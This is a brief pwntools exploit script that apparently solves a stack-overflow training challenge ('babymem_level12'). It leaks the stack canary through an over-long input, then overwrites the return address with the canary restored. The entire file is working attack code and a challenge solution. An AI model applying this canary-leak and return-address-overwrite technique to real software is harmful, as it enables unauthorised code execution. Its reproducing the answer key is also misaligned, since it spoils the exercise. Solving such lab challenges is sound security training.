#!/usr/bin/env python3

from pwn import *

# Create a process
p = process('/babymem_level12_testing2')

# Send payload size
p.sendline(b"41")

# Send payload
p.send(b"REPEAT" + b"a" * 35)

# Retrieve stack canary
stack_canary = int.from_bytes(p.recvline_startswith(b"You said: ")[51:58], "little")
print(hex(stack_canary))

# Re-enter function again
# Send payload size
p.sendline(b"58")

# Send payload
p.send(b"a" * 40 + p64(stack_canary * 256) + b"a" * 8 + p16(0x18e4))
p.interactive()
